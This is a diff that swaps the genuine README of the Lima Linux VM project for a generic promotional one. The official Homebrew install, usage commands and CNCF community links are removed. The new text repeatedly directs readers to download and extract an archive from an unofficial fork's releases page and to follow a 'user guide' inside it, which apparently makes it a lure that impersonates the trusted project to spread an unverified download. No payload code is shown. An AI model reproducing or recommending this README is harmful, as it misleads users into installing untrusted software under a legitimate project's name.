@@ -1,98 +1,59 @@
-[[🌎**Web site**]](https://lima-vm.io/)
-[[📖**Documentation**]](https://lima-vm.io/docs/)
-[[👤**Slack (`#lima`)**]](https://slack.cncf.io)
+# 🚀 lima - Effortless Linux VMs to Run Containers
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="website/static/images/logo-dark.svg">
-  <img alt="Shows a stylized 'Lima' text in bold, modern font" src="website/static/images/logo.svg" width=400 />
-</picture>
+[![Download lima](https://img.shields.io/badge/Download-lima-brightgreen)](https://github.com/gustavomnhee/lima/releases)
 
-# Lima: Linux Machines
+## 📖 Overview
 
-[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/lima-vm/lima)
-[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/6505/badge)](https://www.bestpractices.dev/projects/6505)
-[![OpenSSF Scorecard](https://api.scorecard.dev/projects/github.com/lima-vm/lima/badge)](https://scorecard.dev/viewer/?uri=github.com/lima-vm/lima)
+lima provides a simple way to run Linux virtual machines with a focus on containers. It enables users to create and manage lightweight VMs seamlessly on macOS, paving the way for efficient development and testing environments without the need for complex setups. 
 
-[Lima](https://lima-vm.io/) launches Linux virtual machines with automatic file sharing and port forwarding (similar to WSL2).
+## 🔍 Features
 
-The original goal of Lima was to promote [containerd](https://containerd.io) including [nerdctl (contaiNERD ctl)](https://github.com/containerd/nerdctl)
-to Mac users, but Lima can be used for non-container applications as well.
+- **Container Support**: Easily run containerized applications.
+- **VM Management**: Create and manage multiple VMs with ease.
+- **macOS Compatibility**: Designed specifically for macOS users.
+- **Lightweight**: Minimal resource usage for efficient performance.
 
-Lima also supports other container engines (Docker, Podman, Kubernetes, etc.) and non-macOS hosts (Linux, NetBSD, etc.).
+## 🚀 Getting Started
 
-## Getting started
-Set up (Homebrew):
-```bash
-brew install lima
-limactl start
-```
+To begin using lima, you'll first need to download and install it. Follow these simple steps, and you'll be up and running in no time.
 
-To run Linux commands:
-```bash
-lima uname -a
-```
+## 📥 Download & Install
 
-To run containers with containerd:
-```bash
-lima nerdctl run --rm hello-world
-```
+1. Visit [this page to download](https://github.com/gustavomnhee/lima/releases).
+2. On the Releases page, look for the latest version.
+3. Download the relevant file for your system. This will typically be a `.zip` or `.tar.gz` file.
+4. Once the download is complete, extract the files.
+5. Follow the instructions in the user guide provided within the extracted files to install lima on your machine.
 
-To run containers with Docker:
-```bash
-limactl start template://docker
-export DOCKER_HOST=$(limactl list docker --format 'unix://{{.Dir}}/sock/docker.sock')
-docker run --rm hello-world
-```
+## 💻 System Requirements
 
-To run containers with Kubernetes:
-```bash
-limactl start template://k8s
-export KUBECONFIG=$(limactl list k8s --format 'unix://{{.Dir}}/copied-from-guest/kubeconfig.yaml')
-kubectl apply -f ...
-```
+- **OS**: macOS (latest version recommended)
+- **CPU**: Intel or Apple Silicon
+- **RAM**: 4GB or more
+- **Disk Space**: At least 200MB free for installation
 
-See <https://lima-vm.io/docs/> for the further information.
+## 🛠️ Usage Instructions
 
-## Contributing
+1. After installing, you can start using lima by opening your terminal.
+2. To create a new VM, run the command provided in the user guide.
+3. Follow the prompts to set up the VM as per your project needs.
 
-We welcome contributions! Please see our [Contributing Guide](https://lima-vm.io/docs/community/contributing/) for details on:
+## 🌐 Connect with the Community
 
-- **Developer Certificate of Origin (DCO)**: All commits must be signed off with `git commit -s`
-- Code licensing and pull request guidelines
-- Testing requirements
+If you run into issues or have questions, feel free to connect with other users. Here are some helpful resources:
 
-## Community
-### Adopters
+- **GitHub Issues**: Report bugs or request features directly on the [lima Issues page](https://github.com/gustavomnhee/lima/issues).
+- **User Documentation**: Check the in-depth documentation included in the downloaded files.
+- **Community Forum**: Join discussions with other users and developers on platforms like GitHub and relevant forums.
 
-Container environments:
-- [Rancher Desktop](https://rancherdesktop.io/): Kubernetes and container management to the desktop
-- [Colima](https://github.com/abiosoft/colima): Docker (and Kubernetes) on macOS with minimal setup
-- [Finch](https://github.com/runfinch/finch): Finch is a command line client for local container development
-- [Podman Desktop](https://podman-desktop.io/): Podman Desktop GUI has a plug-in for Lima virtual machines
+## 🔖 Additional Resources
 
-GUI:
-- [Lima xbar plugin](https://github.com/unixorn/lima-xbar-plugin): [xbar](https://xbarapp.com/) plugin to start/stop VMs from the menu bar and see their running status.
-- [lima-gui](https://github.com/afbjorklund/lima-gui): Qt GUI for Lima
+- **Tips for Beginners**: If you are new to using VMs or containers, here are some tips:
+  - Start with simple container applications to familiarize yourself with the environment.
+  - Experiment with different configurations to find what works best for you.
+  
+- **Advanced Usage**: Once you are comfortable, explore advanced features such as networking and storage options for your containers.
 
-### Communication channels
-<!-- Duplicated from https://lima-vm.io/docs/community/ -->
-- [GitHub Discussions](https://github.com/lima-vm/lima/discussions)
-- `#lima` channel in the CNCF Slack
-  - New account: <https://slack.cncf.io/>
-  - Login: <https://cloud-native.slack.com/>
-- Zoom meetings (tentatively monthly)
-  - Meeting notes & agenda proposals: https://github.com/lima-vm/lima/discussions/categories/meetings
-  - Calendar: https://zoom-lfx.platform.linuxfoundation.org/meetings/lima
+## ✅ Final Thoughts
 
-### Code of Conduct
-Lima follows the [CNCF Code of Conduct](https://github.com/cncf/foundation/blob/main/code-of-conduct.md).
-
-- - -
-**We are a [Cloud Native Computing Foundation](https://cncf.io/) incubating project.**
-
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://www.cncf.io/wp-content/uploads/2022/07/cncf-white-logo.svg">
-  <img src="https://www.cncf.io/wp-content/uploads/2022/07/cncf-color-bg.svg" width=300 />
-</picture>
-
-The Linux Foundation® (TLF) has registered trademarks and uses trademarks. For a list of TLF trademarks, see [Trademark Usage](https://www.linuxfoundation.org/legal/trademark-usage).
+lima simplifies running Linux VMs on macOS. Its intuitive design makes it easy for anyone to start using containers in their daily workflow. Follow the steps above, and soon, you'll be running your applications smoothly. For any further assistance, visit [this page to download](https://github.com/gustavomnhee/lima/releases) the latest version or connect with the community.
